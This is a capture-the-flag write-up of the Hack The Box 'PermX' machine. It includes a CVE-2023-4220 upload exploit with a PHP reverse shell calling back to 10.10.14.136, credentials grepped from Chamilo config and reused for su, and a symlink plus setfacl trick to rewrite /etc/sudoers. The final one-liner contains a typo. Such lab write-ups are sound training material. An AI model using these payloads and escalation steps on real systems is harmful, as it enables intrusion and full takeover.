# [PermX](https://app.hackthebox.com/machines/PermX) Writeup [HTB]
## 🔎 Investigating the website
As per usual, I begin by scanning the services that are exposed using `nmap`. The only services are ports 22 (ssh) and 80 (http). I also discover that the host name is `permx.htb`. To solve the classic DNS error, I add it to the list of known hosts.

The website is an e-learning platform, providing information on which courses are offered and how to join them. There are a couple of forms, but none of them are actually working. The code doesn't look suspicious, either. Time to change approach!

## 🐝 Fuzzing for subdomains
As I cannot find anything interesting on the website, I run `feroxbuster` to explore the directories. Again, this doesn't bring me any results. 
I am once again saved by the Internet, here to introduce me to `ffuf`, a lovely tool to fuzz (among other things) website subdomains. 
The tool returns an insane amount of false positives. Luckily, they all have the same number of words, so I can easily filter them.
```sh
$ ffuf -w big.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -fw 18
[...]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 5176ms]
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 46ms]
```
I add this new-found hostname to `/etc/hosts`, and I'm ready to go!
```sh
$ vim /etc/hosts
# add this line
10.10.11.23 permx.htb   lms.permx.htb
```

## 🐚 Getting the reverse shell
The `lms` subdomain is a Chamilo login form, asking for username and password. There is also a "lost password" functionality, to recover it, and a hidden text field whose significance is a mystery to me.

Since the webpage footnote shows the admin's address (`admin@permx.htb`), my first attempt consists in asking to recover the admin's password, and trying to intercept the email with the instructions. However, the website is not actually able to send emails.

I proceed with looking for Chamilo's known vulnerabilities. [CVE-2023-3368](https://starlabs.sg/advisories/23/23-3368/) (command injection) looks promising at first, but running the POC reveals that the website is not vulnerable to it. 
I then try with [CVE-2023-4220](https://starlabs.sg/advisories/23/23-4220/) (remote code execution), whose POC is even simpler:
```sh
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.14.136/4815 0>&1'\''"); ?>' > rce.php
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
```
Now I just need to open a channel on port 4815 and get the reverse shell!

## 👾 Becoming an actual user
As per usual, I am now impersonating good old `www-data`. A simple search reveals the name of my target user:
```
$ ls /home
mtz
```
I start looking for the user password, hoping to find it lying around in plaintext. 
First, I search for the `.env` file, but it's not there. Then, I decide to explore the `chamilo/app/config/` folder, grepping for the word "password". And sure enough, it's right there!
```sh
$ grep -r "password" /var/www/chamilo/app/config
[...]
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```
I change user, and get the first flag!
```sh
$ su - mtz
Password: 03F6lY3uXAP2bkW8
$ cat user.txt
<USER FLAG>
```

## 🔑 Who needs passwords anyway, ew
The first thing I do with my new "mtz" identity is checking whether it has some sudo permissions:
```sh
$ sudo -l
[...]
User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

This smells like privilege escalation! I immediately examine the script:
```sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
This script can be used to modify permissions for _any_ file, as long as it can be found in `/home/mtz`. Since the script doesn't solve paths, but simply checks if the target string starts with "/home/mtz", this limitation can be easily overcome thanks to soft links. 

My first attempt consists in linking the `/root/root.txt` file, gaining read permissions and printing its content. 
However, this approach fails when calling `setfacl`, most likely due to the fact that mtz can neither read nor execute the `/root` directory.

Conscious of this new limitation, I choose to target a different directory, one that I can actually read: `/etc`. Specifically, I want to gain writing privileges on `/etc/sudoers`, and remove the need for mtz to use passwords. Forever.
```sh
$ ln -s /etc/sudoers /home/mtz/file
$ sudo /opt/acl.sh mtz rwx /home/mtz/file
```
Now I can print the sudoers file and see which line I need to modify. It's the last one:
```sh
# the current line...
mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
# ...must become
mtz ALL=(ALL:ALL) NOPASSWD: ALL
```
I'm so close to the flag, yet so far. 
The box is, for some reason, very instable: my files keep disappearing, the sudoers permissions are removed, and the machine is reset by the other players every 5 minutes. After many failed attempts, I gain all my commands and run them in one go:
```sh
$ n -s /etc/sudoers file; sudo /opt/acl.sh mtz rwx /home/mtz/file; head -n -1 /home/mtz/file > temp_file; echo "mtz ALL=(ALL) NOPASSWD: ALL" >> temp_file; cat temp_file > /etc/sudoers; sudo cat /root/root.txt
<ROOT FLAG>
```

## 💥 Conclusion
A fun machine (except for the part when it kept exploding, lol). Looking forward to the official writeup!
